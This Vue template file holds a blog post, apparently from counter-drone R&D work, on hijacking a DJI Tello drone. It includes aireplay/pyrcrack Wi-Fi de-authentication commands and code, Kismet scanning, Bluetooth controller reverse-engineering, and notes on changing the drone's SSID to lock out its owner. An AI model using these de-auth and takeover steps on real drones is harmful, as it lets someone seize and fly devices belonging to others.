<script setup lang="ts">
import "@/assets/blog.css";
</script>
<template>
  <title>Blog Tello Hack</title>
  <div class="container">
    <div class="content">
      <h1 id="a-way-to-hack-dji-tello">A way to hack Dji Tello</h1>
      <p>
        I got an R&amp;D job few weeks ago that required me to hack multiple
        drones, also known as <em>Counter-Unmanned Aircraft Swarm System</em>.
        I'm in charge of confrontation and simulation work, but this is my first
        foray into the field, so first and foremost, I need to understand how to
        hack a single simple drone.
      </p>
      <h2 id="system-design">System design</h2>
      <p>
        Using a <strong>DJI Tello</strong> drone play victim role, a
        <strong>Rock Pi</strong> as attacker program carrier, and a
        <strong>GameSir T1d</strong> as attacker controller.
      </p>
      <p>
        <img
          src="/src/assets/img/IMG20220929185104.jpg"
          alt="image"
          height="400px"
        />
      </p>
      <p>
        Two Wi-Fi cards are also required, one of which must be in monitor mode.
      </p>
      <blockquote>
        <p>
          I chose the RK3399 chip as the card, but the RockPi pre-built Ubuntu
          Focal <strong>didn't enable</strong> this driver by default; choose a
          right device make your life easier.
        </p>
      </blockquote>
      <p>
        This system use front-end and back-end separated web service
        architecture, based on Ubuntu Server OS.
      </p>
      <p>
        Use <code>kismet</code> to monitor devices information,
        <code>aircrack-ng</code> handle de-auth attack,
        <code>NetworkManager</code> and <code>python-socket</code> controls
        connection.
      </p>
      <h3 id="take-a-try-first">Take a try first</h3>
      <pre
        class="hljs"
      ><code><div>sudo airmon-ng start &lt;wlan_card&gt; # Enable monitor.
<span class="hljs-meta">
#</span><span class="bash"> Browser `localhost:2501` to use kismet web UI,</span>
<span class="hljs-meta">#</span><span class="bash"> you can find drone`s MAC address easily.</span>
kismet -c &lt;wlan_card_mon&gt;
<span class="hljs-meta">
#</span><span class="bash"> Connect to your drone from phone app, and de-authentication yourself</span>
sudo aireplay -D -deauth 10 -a &lt;drone_macaddr&gt; &lt;another_wlan_card&gt;
</div></code></pre>
      <p>
        During a de-auth attack, the connection becomes extremely unstable, even
        disconnecting. It's work, huh, but you'll notice your phone is still
        trying to reconnect, sometimes successfully.
      </p>
      <p>
        This is a sign to the hacker: the owner can get his drone back, and you
        don't want this happen.
      </p>
      <p>We need to clean what we exact need.</p>
      <h3 id="sort-out-the-needs">Sort out the needs</h3>
      <p>In theory, the hacking flow should be like this:</p>
      <ol>
        <li>de-auth attack to break connection from owner and drone.</li>
        <li>Hacker try connect drone during attack.</li>
        <li>
          Once connected, change drone's SSID to avoid owner connect back, also
          a password is necessary.
        </li>
        <li>Hacker can use a controller to control drone.</li>
      </ol>
      <h2 id="development">Development</h2>
      <h3 id="monitor">Monitor</h3>
      <p>
        Locate to <strong>kismet</strong> web ui &gt; setting &gt; api &gt; api
        token, create a token that you can use kismet as a web server, there is
        a API allow you have devices data with closable fields:
        <code>/devices/views/phydot11_accesspoints/devices.json</code>
      </p>
      <pre
        class="hljs"
      ><code><div><span class="hljs-comment">// TypeScript</span>
<span class="hljs-keyword">declare</span> <span class="hljs-keyword">namespace</span> API {
    <span class="hljs-keyword">interface</span> Drone_Data {
        [x: <span class="hljs-built_in">string</span>]: <span class="hljs-built_in">any</span>;
        data?: [];
    }
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getDroneInfo</span>(<span class="hljs-params"></span>) </span>{
    <span class="hljs-keyword">return</span> request&lt;API.Drone_Data&gt;(
        <span class="hljs-string">"/devices/views/phydot11_accesspoints/devices.json"</span>,
        {
            method: <span class="hljs-string">"POST"</span>,
            params: { KISMET: <span class="hljs-string">"a_kismet_api_token"</span> },
            data: {
                fields: [
                    <span class="hljs-string">"kismet.device.base.macaddr"</span>,
                    <span class="hljs-string">"uav.device"</span>,
                    <span class="hljs-string">"kismet.device.base.commonname"</span>,
                    <span class="hljs-string">"kismet.device.base.channel"</span>,
                    <span class="hljs-string">"dot11.device/dot11.device.associate_ssid_map"</span>
                ],
            },
            ...(Option || []),
        },
    );
}
</div></code></pre>
      <h3 id="attacker">Attacker</h3>
      <p>
        <strong>pyrcrack</strong> have a simple command to achieve de-auth
        attack:
      </p>
      <pre class="hljs"><code><div><span class="hljs-comment"># Python</span>
<span class="hljs-keyword">import</span> asyncio

<span class="hljs-keyword">from</span> pyrcrack <span class="hljs-keyword">import</span> AireplayNg


<span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">deauth</span><span class="hljs-params">(interface, macaddr, cliaddr)</span>:</span>
    <span class="hljs-keyword">async</span> <span class="hljs-keyword">with</span> AireplayNg() <span class="hljs-keyword">as</span> aireplay:
        <span class="hljs-keyword">async</span> <span class="hljs-keyword">for</span> res <span class="hljs-keyword">in</span> aireplay(interface, deauth=<span class="hljs-number">10</span>, D=<span class="hljs-literal">True</span>, a=macaddr, c=cliaddr):
            <span class="hljs-keyword">await</span> asyncio.sleep(<span class="hljs-number">1</span>)

<span class="hljs-comment"># Usage:</span>
<span class="hljs-comment"># asyncio.run(deauth('wlan_card_mon','kismet.device.base.macaddr','dot11.device/dot11.device.associate_ssid_map'))</span>
</div></code></pre>
      <p>
        Declare &quot;cliaddr&quot; which is the last connection device from
        drone, let de-auth attack only effect between drone and its owner.
      </p>
      <h3 id="controller">Controller</h3>
      <p>
        Duo to the GameSir T1d cannot connect to the drone directly when hacked,
        I decided to use <strong>TelloPy</strong> as controller middleware to
        convert the T1d signal into a drone control command.
      </p>
      <p>
        T1d uses Bluetooth protocol to transmit data; there are three Services,
        with the third receiving an unchanged byte stream and the second
        changing at random. The byte stream received by a Service whose UUID
        begins with <code>00008651</code> changes on a regular basis.
      </p>
      <p>
        When T1d on idle, the value received by the first Service is always been
        <code>C9-C6-86-A1-00-DB-B9-03-01-01-01-0B-01-E1-07-07-06-10-1E-56</code
        >.
      </p>
      <p>
        The first two Bytes are always <code>A1-C5</code> when there is action.
      </p>
      <p>
        As a result, the first two bytes can be used to determine the state of
        the remote control.
      </p>
      <blockquote>
        <p>
          Notice: Rock Pi is Big-Endian, you will need change the hex value
          <code>A1-C5</code> to <code>C5-A1</code>.
        </p>
      </blockquote>
      <p>
        The last byte is always self-incrementing when T1d status on
        <code>C5-A1</code>.
      </p>
      <p>
        When you press the button, the byte will increase by 2 until
        <code>0xFF</code>, then return to <code>0x00</code>. This is used to
        keep track of how many times the button is pressed.
      </p>
      <p>
        Bytes 10-13 represent the state of the pressed button, and each button
        on the handle corresponds to one bit. In fact, as long as these bytes
        are read out one by one, they can correspond to the keys.
      </p>
      <p>
        For stickers, bytes 3-7 represent the joystick's state. It took some
        time to figure out which joystick corresponded to which bytes at first.
        Later, I discovered that it was actually quite simple to guess. A total
        of 5 bytes, 2 joysticks in a total of 4 directions, resulting in 10bit
        per direction.
      </p>
      <p>In general, 10bit AD is also quite common.</p>
      <pre class="hljs"><code><div>11 bits (-1024 ~ +1023) x 4 axis = 44 bits
fast_mode takes 1 bit
44 bits will be packed in to 6 bytes (48 bits)
            axis4      axis3      axis2      axis1
     |          |          |          |          |
         4         3         2         1         0
98765432109876543210987654321098765432109876543210
 |       |       |       |       |       |       |
     byte5   byte4   byte3   byte2   byte1   byte0
</div></code></pre>
      <p>
        So long as these bytes are read out and then rounded up every 10 bits
        into an integer, the joystick can be read again.
      </p>
      <p>A example code for displaying the T1d signal value is as follows:</p>
      <pre class="hljs"><code><div><span class="hljs-comment"># Python</span>
<span class="hljs-keyword">import</span> time
<span class="hljs-keyword">import</span> struct
<span class="hljs-keyword">from</span> bluepy.btle <span class="hljs-keyword">import</span> Peripheral

my_gamesir = Peripheral(<span class="hljs-string">'t1d_macaddr'</span>, <span class="hljs-string">'random'</span>)
services = my_gamesir.getServices()  <span class="hljs-comment"># get bluetooth service from device</span>

<span class="hljs-keyword">for</span> service <span class="hljs-keyword">in</span> services:
    services_to_list = list(services)  <span class="hljs-comment"># convert dict to list</span>
    control_service = services_to_list[<span class="hljs-number">2</span>]  <span class="hljs-comment"># get elements on index 2</span>
    charac_dics = control_service.getCharacteristics()  <span class="hljs-comment"># get bluetooth characteristics</span>
    <span class="hljs-keyword">for</span> charac <span class="hljs-keyword">in</span> charac_dics:
        print(charac.uuid)
        <span class="hljs-keyword">pass</span>
    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
        time.sleep(<span class="hljs-number">0.1</span>)
        charac1, charac2, charac3 = [item.read() <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> charac_dics]
        status_code = struct.unpack(<span class="hljs-string">'H'</span>, charac1[:<span class="hljs-number">2</span>])[<span class="hljs-number">0</span>]

        print(status_code)

        <span class="hljs-keyword">if</span> status_code == <span class="hljs-number">50593</span>:
            <span class="hljs-comment"># key value, each key on the joystick has a fixed value.</span>
            on_press_key = struct.unpack(<span class="hljs-string">'I'</span>, charac1[<span class="hljs-number">9</span>:<span class="hljs-number">13</span>])[<span class="hljs-number">0</span>]

            bar_status = struct.unpack(<span class="hljs-string">'5B'</span>, charac1[<span class="hljs-number">2</span>:<span class="hljs-number">7</span>])
            bar_status_bin = <span class="hljs-string">''</span>.join([bin(item).split(<span class="hljs-string">'b'</span>)[<span class="hljs-number">1</span>].rjust(
                <span class="hljs-number">8</span>).replace(<span class="hljs-string">' '</span>, <span class="hljs-string">'0'</span>) <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> bar_status])

            left_x = (bar_status_bin[<span class="hljs-number">0</span>:<span class="hljs-number">10</span>], <span class="hljs-number">2</span>)
            left_y = (bar_status_bin[<span class="hljs-number">10</span>:<span class="hljs-number">20</span>], <span class="hljs-number">2</span>)
            right_x = (bar_status_bin[<span class="hljs-number">20</span>:<span class="hljs-number">30</span>], <span class="hljs-number">2</span>)

            <span class="hljs-comment"># convert to int will see the value is 0~1023,</span>
            <span class="hljs-comment"># on idle is 512 (0x200), push forward is 512~0, backward is 512~1023</span>
            right_y = int(bar_status_bin[<span class="hljs-number">30</span>:<span class="hljs-number">40</span>], <span class="hljs-number">2</span>)

            print(<span class="hljs-string">"status %s"</span> % status_code, end=<span class="hljs-string">'  '</span>)
            print(<span class="hljs-string">"on_press %s"</span> % on_press_key, end=<span class="hljs-string">'  '</span>)
            print(<span class="hljs-string">"left_x %s"</span> % left_x, end=<span class="hljs-string">'  '</span>)
            print(<span class="hljs-string">"right_x %s"</span> % right_x, end=<span class="hljs-string">'  '</span>)
            print(<span class="hljs-string">"left_y %s"</span> % left_y, end=<span class="hljs-string">'  '</span>)
            print(<span class="hljs-string">"right_y %s"</span> % right_y, end=<span class="hljs-string">'\r'</span>)
</div></code></pre>
      <p>Mapping keys to the hex value:</p>
      <pre class="hljs"><code><div><span class="hljs-comment"># Python</span>
<span class="hljs-comment"># Big endian</span>
switch = {
    <span class="hljs-number">0x40</span>: <span class="hljs-string">'L1'</span>,
    <span class="hljs-number">0x80</span>: <span class="hljs-string">'R1'</span>,
    <span class="hljs-number">0x100</span>: <span class="hljs-string">'L2'</span>,
    <span class="hljs-number">0x200</span>: <span class="hljs-string">'R2'</span>,
    <span class="hljs-number">0x01</span>: <span class="hljs-string">'A'</span>,
    <span class="hljs-number">0x02</span>: <span class="hljs-string">'B'</span>,
    <span class="hljs-number">0x08</span>: <span class="hljs-string">'X'</span>,
    <span class="hljs-number">0x10</span>: <span class="hljs-string">'Y'</span>,
    <span class="hljs-number">0x4</span>: <span class="hljs-string">'Menu'</span>,
    <span class="hljs-number">0x400</span>: <span class="hljs-string">'C1'</span>,
    <span class="hljs-number">0x800</span>: <span class="hljs-string">'C2'</span>,
    <span class="hljs-number">0x10000</span>: <span class="hljs-string">'Up'</span>,
    <span class="hljs-number">0x30000</span>: <span class="hljs-string">'Right'</span>,
    <span class="hljs-number">0x50000</span>: <span class="hljs-string">'Down'</span>,
    <span class="hljs-number">0x70000</span>: <span class="hljs-string">'Left'</span>,
}
</div></code></pre>
      <p>
        <strong>TelloPy</strong> gave a game controller stick mapper (function
        <code>__send_stick_command</code>) to control drone, so I motif it to
        adapt T1d:
      </p>
      <pre class="hljs"><code><div><span class="hljs-comment"># Python</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">_send_stick_command</span><span class="hljs-params">(drone, stick_values)</span>:</span>
    pkt = Packet(STICK_CMD, <span class="hljs-number">0x60</span>)
    left_x, left_y, right_x, right_y = stick_values

    axis1 = (<span class="hljs-number">512</span> + left_x) &amp; <span class="hljs-number">0x7ff</span>
    axis2 = (<span class="hljs-number">1536</span> - right_y) &amp; <span class="hljs-number">0x7ff</span>
    axis3 = (<span class="hljs-number">1536</span> - left_y) &amp; <span class="hljs-number">0x7ff</span>
    axis4 = (<span class="hljs-number">512</span> + right_x) &amp; <span class="hljs-number">0x7ff</span>

    pkt.add_byte(((axis2 &lt;&lt; <span class="hljs-number">11</span> | axis1) &gt;&gt; <span class="hljs-number">0</span>) &amp; <span class="hljs-number">0xff</span>)
    pkt.add_byte(((axis2 &lt;&lt; <span class="hljs-number">11</span> | axis1) &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xff</span>)
    pkt.add_byte(((axis3 &lt;&lt; <span class="hljs-number">11</span> | axis2) &gt;&gt; <span class="hljs-number">5</span>) &amp; <span class="hljs-number">0xff</span>)
    pkt.add_byte(((axis4 &lt;&lt; <span class="hljs-number">11</span> | axis3) &gt;&gt; <span class="hljs-number">2</span>) &amp; <span class="hljs-number">0xff</span>)
    pkt.add_byte(((axis4 &lt;&lt; <span class="hljs-number">11</span> | axis3) &gt;&gt; <span class="hljs-number">10</span>) &amp; <span class="hljs-number">0xff</span>)
    pkt.add_byte(((axis4 &lt;&lt; <span class="hljs-number">11</span> | axis3) &gt;&gt; <span class="hljs-number">18</span>) &amp; <span class="hljs-number">0xff</span>)
    pkt.add_time()
    pkt.fixup()
    drone.send_packet(pkt)
</div></code></pre>
      <p>Finally, we can connect to a drone and control ti with T1d:</p>
      <pre class="hljs"><code><div><span class="hljs-comment"># Python</span>
<span class="hljs-keyword">import</span> struct
<span class="hljs-keyword">import</span> sys

<span class="hljs-keyword">from</span> tellopy <span class="hljs-keyword">import</span> Tello
<span class="hljs-keyword">from</span> tellopy._internal.protocol <span class="hljs-keyword">import</span> Packet, STICK_CMD
<span class="hljs-keyword">from</span> bluepy.btle <span class="hljs-keyword">import</span> Peripheral

global_data = <span class="hljs-literal">None</span>


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">_send_stick_command</span><span class="hljs-params">(drone, stick_values)</span>:</span>
    pkt = Packet(STICK_CMD, <span class="hljs-number">0x60</span>)
    left_x, left_y, right_x, right_y = stick_values

    axis1 = (<span class="hljs-number">512</span> + left_x) &amp; <span class="hljs-number">0x7ff</span>
    axis2 = (<span class="hljs-number">1536</span> - right_y) &amp; <span class="hljs-number">0x7ff</span>
    axis3 = (<span class="hljs-number">1536</span> - left_y) &amp; <span class="hljs-number">0x7ff</span>
    axis4 = (<span class="hljs-number">512</span> + right_x) &amp; <span class="hljs-number">0x7ff</span>

    pkt.add_byte(((axis2 &lt;&lt; <span class="hljs-number">11</span> | axis1) &gt;&gt; <span class="hljs-number">0</span>) &amp; <span class="hljs-number">0xff</span>)
    pkt.add_byte(((axis2 &lt;&lt; <span class="hljs-number">11</span> | axis1) &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xff</span>)
    pkt.add_byte(((axis3 &lt;&lt; <span class="hljs-number">11</span> | axis2) &gt;&gt; <span class="hljs-number">5</span>) &amp; <span class="hljs-number">0xff</span>)
    pkt.add_byte(((axis4 &lt;&lt; <span class="hljs-number">11</span> | axis3) &gt;&gt; <span class="hljs-number">2</span>) &amp; <span class="hljs-number">0xff</span>)
    pkt.add_byte(((axis4 &lt;&lt; <span class="hljs-number">11</span> | axis3) &gt;&gt; <span class="hljs-number">10</span>) &amp; <span class="hljs-number">0xff</span>)
    pkt.add_byte(((axis4 &lt;&lt; <span class="hljs-number">11</span> | axis3) &gt;&gt; <span class="hljs-number">18</span>) &amp; <span class="hljs-number">0xff</span>)
    pkt.add_time()
    pkt.fixup()
    drone.send_packet(pkt)


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">_get_stick_values</span><span class="hljs-params">(chars1)</span>:</span>
    bar_status = struct.unpack(<span class="hljs-string">'5B'</span>, chars1[<span class="hljs-number">2</span>:<span class="hljs-number">7</span>])
    bar_status_bin = <span class="hljs-string">''</span>.join([bin(item).split(<span class="hljs-string">'b'</span>)[<span class="hljs-number">1</span>].rjust(
        <span class="hljs-number">8</span>).replace(<span class="hljs-string">' '</span>, <span class="hljs-string">'0'</span>) <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> bar_status])

    left_x = int(bar_status_bin[<span class="hljs-number">0</span>:<span class="hljs-number">10</span>], <span class="hljs-number">2</span>)
    left_y = int(bar_status_bin[<span class="hljs-number">10</span>:<span class="hljs-number">20</span>], <span class="hljs-number">2</span>)
    right_x = int(bar_status_bin[<span class="hljs-number">20</span>:<span class="hljs-number">30</span>], <span class="hljs-number">2</span>)
    right_y = int(bar_status_bin[<span class="hljs-number">30</span>:<span class="hljs-number">40</span>], <span class="hljs-number">2</span>)

    <span class="hljs-keyword">return</span> [left_x, left_y, right_x, right_y]


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dispatch</span><span class="hljs-params">(drone, chars1)</span>:</span>
    <span class="hljs-keyword">global</span> flight_data
    status_code = struct.unpack(<span class="hljs-string">'H'</span>, chars1[:<span class="hljs-number">2</span>])[<span class="hljs-number">0</span>]

    <span class="hljs-keyword">if</span> status_code == <span class="hljs-number">0xC5A1</span>:
        keys = struct.unpack(<span class="hljs-string">'I'</span>, chars1[<span class="hljs-number">9</span>:<span class="hljs-number">13</span>])[<span class="hljs-number">0</span>]
        <span class="hljs-keyword">if</span> (keys == <span class="hljs-number">0x110</span>):
            drone.flip_forward()
        <span class="hljs-keyword">elif</span> (keys == <span class="hljs-number">0x210</span>):
            <span class="hljs-keyword">if</span> (flight_data <span class="hljs-keyword">and</span> flight_data.height &gt; <span class="hljs-number">0.5</span>):
                drone.land()
            <span class="hljs-keyword">else</span>:
                drone.takeoff()
        <span class="hljs-keyword">elif</span> (keys == <span class="hljs-number">0</span>):
            _send_stick_command(drone, _get_stick_values(chars1))


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">handler</span><span class="hljs-params">(event, sender, data, **args)</span>:</span>
    <span class="hljs-keyword">global</span> flight_data
    <span class="hljs-keyword">if</span> event <span class="hljs-keyword">is</span> sender.EVENT_FLIGHT_DATA:
        flight_data = data


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">_connect_drone</span><span class="hljs-params">(drone)</span>:</span>
    <span class="hljs-keyword">try</span>:
        drone.subscribe(drone.EVENT_FLIGHT_DATA, handler)
        drone.connect()
        drone.wait_for_connection(<span class="hljs-number">60.0</span>)
    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> ex:
        print(<span class="hljs-string">"Unable to connect drones%s"</span> % ex)


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span><span class="hljs-params">()</span>:</span>
    drone = Tello()
    <span class="hljs-keyword">try</span>:
        _connect_drone(drone)

        gamesir_t1d = Peripheral(&lt;t1d_macaddr&gt;, <span class="hljs-string">'random'</span>)

        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
            chars_dics = list(gamesir_t1d.getServices())[
                <span class="hljs-number">2</span>].getCharacteristics()

            chars1, _chars2, _chars3 = [item.read() <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> chars_dics]
            dispatch(drone, chars1)

    <span class="hljs-keyword">except</span> KeyboardInterrupt:
        print(<span class="hljs-string">"Existing..."</span>)
        drone.land()
        drone.quit()
        sys.exit()

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
    main()


<span class="hljs-comment"># Usage:</span>
<span class="hljs-comment"># 1. Change &lt;t1d_macaddr&gt; to your GameSir T1d MAC address.</span>
<span class="hljs-comment"># 2. Connect to drone.</span>
<span class="hljs-comment"># 3. `python3 this.program.py`</span>

</div></code></pre>
      <p>
        There are still some &quot;TODO:&quot; items to complete, such as the
        rub connection and changing the SSID; I won't go into detail in this
        blog, but here are some points:
      </p>
      <ul>
        <li>
          <p>
            Ubuntu controls Wi-Fi via NetworkManager, I use d-bus to control
            NetworkManager. Create a multithreaded process that sends connection
            requests erratically during a de-auth attack.
          </p>
        </li>
        <li>
          <p>
            The Tello SDK includes a Python example that demonstrates how to
            send a text command:
            <code>sock.sendto('wifi new ssid&gt; pwd&gt;', tello address)</code
            >.
          </p>
        </li>
        <li>
          <p>
            The hole program has multiple job running in asynchronous, jobs need
            response a statue to frontend, use a task queue such as
            <code>flask-celery</code> will make schedule easier.
          </p>
        </li>
      </ul>
      <h2 id="references--spacial-thanks">References &amp; Spacial thanks</h2>
      <p>
        <a
          href="https://github.com/NetworkManager/NetworkManager/blob/main/examples/python/dbus/add-wifi-psk-connection.py"
          >https://github.com/NetworkManager/NetworkManager/blob/main/examples/python/dbus/add-wifi-psk-connection.py</a
        >
      </p>
      <p>
        <a href="https://github.com/Diallomm/hack_GamesirT1d"
          >https://github.com/Diallomm/hack_GamesirT1d</a
        >
      </p>
      <p>
        <a href="https://github.com/hanyazou/TelloPy"
          >https://github.com/hanyazou/TelloPy</a
        >
      </p>
      <p>
        <a href="https://github.com/Matthias84/awesome-tello"
          >https://github.com/Matthias84/awesome-tello</a
        >
      </p>
    </div>
  </div>
</template>

<style></style>
